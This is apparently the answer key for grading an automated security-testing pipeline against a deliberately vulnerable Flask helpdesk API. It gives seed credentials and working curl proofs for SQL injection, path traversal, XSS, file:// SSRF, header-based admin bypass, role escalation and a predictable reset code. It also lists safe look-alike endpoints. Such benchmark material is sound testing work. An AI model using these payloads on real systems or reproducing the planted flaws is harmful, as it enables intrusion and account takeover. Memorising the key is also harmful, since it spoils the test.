# DeskHive answer key

Do not open this file (or `app.py`) before running the blind exploration
and analysis pipeline. This exists to grade results afterward.

App: `app.py`, a single-file Flask helpdesk/ticketing API, listening on
`http://127.0.0.1:5002`. Database is rebuilt from scratch on every
start with these seed accounts:

| username    | password       | role     | department | id |
|-------------|----------------|----------|------------|----|
| admin       | AdminPass1!    | admin    | management | 1  |
| agent_bob   | BobPass1!      | agent    | support    | 2  |
| alice       | AlicePass1!    | customer | (none)     | 3  |
| dan         | DanPass1!      | customer | (none)     | 4  |

Seed tickets: ticket 1 (created by alice, assigned to agent_bob,
department `support`) and ticket 2 (created by dan, department
`support`). Both carry a staff-only `internal_notes` field.

All endpoints except `POST /api/login`, `POST /api/register`,
`GET /search-page`, `GET /api/system/health`, and the password-reset
endpoints require `Authorization: Bearer <token>` obtained from
`POST /api/login`.

Every row below was independently verified by sending the exact proof
request against a live, freshly started instance of the app and
observing the described result.

## True positives (12)

| # | Endpoint | Vulnerability class | Expected specialist agent | Proof (commands assume `$TOKEN` = a token from `POST /api/login`) | Verified result |
|---|----------|---------------------|---------------------------|---------------------------------------------------------------------|------------------|
| 1 | `GET /api/tickets/search?q=` | SQL injection (UNION-based) | sqli | `curl -G http://127.0.0.1:5002/api/tickets/search -H "Authorization: Bearer $ALICE_TOKEN" --data-urlencode "q=zzz' UNION SELECT id, username, password_hash, role FROM users -- "` | Response contains all 4 users' `username` and `password_hash` (scrypt digests) instead of ticket rows — full column-count-matched UNION injection into a string-formatted `LIKE` query. |
| 2 | `GET /api/tickets/<id>` | IDOR / broken object-level authorization | idor / broken_access_control | Login as `dan`, then `curl http://127.0.0.1:5002/api/tickets/1 -H "Authorization: Bearer $DAN_TOKEN"` (ticket 1 belongs to `alice`) | Returns ticket 1 in full, including the staff-only `internal_notes` field, to a customer who neither created nor is assigned to it. No ownership/department check exists on this route. |
| 3 | `GET /api/attachments/download?file=` | Path traversal / arbitrary file read | path_traversal | `curl "http://127.0.0.1:5002/api/attachments/download?file=../secret_config.txt" -H "Authorization: Bearer $ALICE_TOKEN"` | Returns the contents of `secret_config.txt`, which lives one directory above the `uploads/` folder the endpoint is meant to be confined to. `os.path.join` is used with no normalization or allowlist check. |
| 4 | Comment body posted via `POST /api/tickets/<id>/comments`, rendered at `GET /tickets/<id>/view` | Stored XSS | xss | `curl -X POST http://127.0.0.1:5002/api/tickets/1/comments -H "Authorization: Bearer $ALICE_TOKEN" -H "Content-Type: application/json" -d '{"body":"<script>alert(document.cookie)</script>"}'` then `curl http://127.0.0.1:5002/tickets/1/view -H "Authorization: Bearer $BOB_TOKEN"` | The staff HTML view returns the literal `<script>alert(document.cookie)</script>` tag unescaped inside the page body (comment body is interpolated into an f-string HTML response with no escaping). |
| 5 | `GET /search-page?q=` | Reflected XSS | xss | `curl "http://127.0.0.1:5002/search-page?q=%3Cscript%3Ealert(1)%3C/script%3E"` (no auth needed) | The response HTML contains the literal, unescaped `<script>alert(1)</script>` inside the "You searched for:" div. |
| 6 | `POST /api/tickets/<id>/import-link` `{"url": ...}` | SSRF (local file read via `file://` scheme) | ssrf | Login as `alice` (owns ticket 1), then `curl -X POST http://127.0.0.1:5002/api/tickets/1/import-link -H "Authorization: Bearer $ALICE_TOKEN" -H "Content-Type: application/json" -d '{"url":"file:///<absolute-path-to>/secret_config.txt"}'` | Response `preview` field contains the full contents of `secret_config.txt`. The server passes the caller-supplied URL directly to `urllib.request.urlopen` with no scheme allowlist, so `file://` (and presumably internal `http://` targets) are reachable. |
| 7 | `DELETE /api/admin/tickets/<id>` | Broken authorization via client-controlled header | broken_access_control / auth | Login as `alice` (customer). `curl -X DELETE http://127.0.0.1:5002/api/admin/tickets/2 -H "Authorization: Bearer $ALICE_TOKEN"` → `{"error":"admin only"}`. Then repeat with header `-H "X-Debug-Role: admin"` added. | Without the header: 403 denied. With `X-Debug-Role: admin` added: `{"message":"ticket deleted"}` and the ticket is confirmed gone afterward. The authorization check trusts a client-supplied header as an override to the real session role. |
| 8 | `PATCH /api/users/<id>` | Mass assignment / privilege escalation | mass_assignment / broken_access_control | Login as `alice` (id 3, role `customer`). `curl -X PATCH http://127.0.0.1:5002/api/users/3 -H "Authorization: Bearer $ALICE_TOKEN" -H "Content-Type: application/json" -d '{"role":"admin"}'` | Response shows `"role":"admin"`. A subsequent `GET /api/admin/stats` with the same (still-customer-issued) token succeeds, confirming the role change took effect server-side. No field whitelist and no check that the caller may only edit their own non-privileged fields. |
| 9 | `GET /api/admin/stats` | Missing authorization (function-level) | broken_access_control | Login as `dan` (plain customer, no tricks). `curl http://127.0.0.1:5002/api/admin/stats -H "Authorization: Bearer $DAN_TOKEN"` | Returns total ticket/user counts and the full user list (id, username, role, department, email) to a non-staff, non-escalated account. The handler checks only that a session exists, never the role. |
| 10 | `POST /api/password-reset/request` + `POST /api/password-reset/confirm` | Broken authentication — predictable reset token | broken_auth | Request a reset for `dan` (`{"username":"dan"}`), then confirm with `code = sha256(f"{dan_user_id}-reset-code")[:6]` computed independently (no need to see the "sent" code) — `curl -X POST .../confirm -d '{"username":"dan","code":"9b4027","new_password":"Hax0red123!"}'`, then log in with the new password. | Confirm returns `{"message":"password updated"}` and `POST /api/login` with `dan` / `Hax0red123!` immediately succeeds. The reset code is `sha256(f"{user_id}-reset-code")[:6]` — fully deterministic from the target's user id, which only ranges 1-4 in this dataset, so it does not depend on intercepting any email. |
| 11 | `GET /api/system/health` | Information disclosure | info_disclosure | `curl http://127.0.0.1:5002/api/system/health` (no auth) | Returns `secret_key_prefix`, the absolute `db_path`, and the absolute `upload_dir` on the server filesystem, with no authentication required at all. |
| 12 | `POST /api/tickets/<id>/rate` `{"rating": n}` | Business logic flaw — unvalidated numeric range, no idempotency | business_logic | Login as ticket owner `alice`. `curl -X POST http://127.0.0.1:5002/api/tickets/1/rate -H "Authorization: Bearer $ALICE_TOKEN" -H "Content-Type: application/json" -d '{"rating":999999}'`, then repeat with `{"rating":-500}` | Both requests return 200 and are accepted verbatim into the stored average (`average_rating` swings to `999999.0`, then `499749.5`); there is no `1-5` bound check and nothing prevents the same account from submitting unlimited ratings for the same ticket, so satisfaction metrics used elsewhere can be arbitrarily skewed. |

## True negatives (6)

| # | Endpoint | Bug class it resembles | Why it's actually safe | Proof | Verified result |
|---|----------|------------------------|-------------------------|-------|------------------|
| A | `POST /api/login` | SQL injection | Query is parameterized (`WHERE username = ?`) and the stored value is a `werkzeug.security` password hash checked with `check_password_hash`, not a plaintext comparison. | `curl -X POST http://127.0.0.1:5002/api/login -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'` and a second attempt with a `' OR '1'='1` payload in the password field. | Both attempts return `{"error":"invalid credentials"}` (401) — no authentication bypass, no SQL error leakage. |
| B | `GET /api/tickets?sort=&order=` | SQL injection via sortable column/order | `sort` and `order` are resolved through a fixed dictionary (`SORTABLE_COLUMNS`) / `ASC`/`DESC` literal check before being interpolated into the `ORDER BY` clause; anything not in the allowlist silently falls back to the default. | `curl -G http://127.0.0.1:5002/api/tickets -H "Authorization: Bearer $ADMIN_TOKEN" --data-urlencode "sort=id); DROP TABLE tickets;--" --data-urlencode "order=asc"` | Request returns a normal 200 ticket list (injection payload ignored, mapped to the default `created_at` column); a follow-up `GET /api/tickets` shows the tickets table is untouched. |
| C | `POST /api/tickets/<id>/comments` | Mass assignment (author/identity spoofing) | The comment's `author_id` is always taken from the authenticated session (`user["id"]`); any `author_id` field in the request body is read but never used. | Login as `alice` (id 3). `curl -X POST http://127.0.0.1:5002/api/tickets/1/comments -H "Authorization: Bearer $ALICE_TOKEN" -d '{"body":"spoof test","author_id":1}'`, then `GET /api/tickets/1/comments`. | The newly created comment is stored with `"author_id":3` (alice's real id), not the `1` (admin) the request body tried to inject. |
| D | `PATCH /api/users/me` | Mass assignment / privilege escalation | Handler explicitly reads only `display_name` and `email` from the body via `data.get(...)`; every other key, including `role` and `department`, is silently ignored. | Login as `dan`. `curl -X PATCH http://127.0.0.1:5002/api/users/me -H "Authorization: Bearer $DAN_TOKEN" -d '{"display_name":"Dan Updated","role":"admin","department":"management"}'` | Response shows `display_name` updated to "Dan Updated" but `role` remains `"customer"` and `department` remains `null` — the extra fields had no effect. |
| E | `GET /api/exports/<token>` | Path traversal | The route parameter is a random 32-hex-char token used purely as a database lookup key (`SELECT filepath FROM exports WHERE token = ?`); the filesystem path served is the one stored in the database, never one built from caller input. | Create an export (`POST /api/tickets/1/export` as its owner) to get a real token, confirm it downloads the CSV; then request a nonexistent/garbage token: `curl http://127.0.0.1:5002/api/exports/totallybogustoken000 -H "Authorization: Bearer $ALICE_TOKEN"`. | Valid token returns the CSV content. The bogus token returns a clean `{"error":"not found"}` (404) — there's no path to redirect the lookup to an arbitrary file since the value is never used as a path component. |
| F | `GET /api/tickets/<id>/comments` | IDOR (contrast with row 2 above) | Unlike the ticket-detail route, this handler explicitly checks that the requester is the ticket's creator, an admin, or an agent in the same department before returning any comments. | Login as `dan`. `curl http://127.0.0.1:5002/api/tickets/1/comments -H "Authorization: Bearer $DAN_TOKEN"` (ticket 1 belongs to alice, department `support`, dan has no department) | Returns `{"error":"not authorized to view this ticket's comments"}` (403). The ticket owner (`alice`) making the same request successfully receives the comment list. |

## Notes for grading

- Row 2 (IDOR on ticket detail) and row F (comments correctly scoped)
  are the same ticket resource with inconsistent enforcement between
  two closely related endpoints — a realistic "fixed it in one place,
  forgot the other" pattern worth watching for in the harness's output.
- Row 7 (header-trusted role override) and row 9 (missing role check
  entirely) are both broken-access-control on admin-only functionality
  but are mechanically distinct bugs on two different endpoints.
- Row 8 and row D are the same *shape* of bug (attacker-controlled
  `role`/`department` in a PATCH body) on two different endpoints, one
  vulnerable and one not — another intentional near-duplicate pair.
- Row 1 and row B both touch query construction from request
  parameters on ticket-related endpoints; only one interpolates
  attacker-controlled data directly into SQL text.
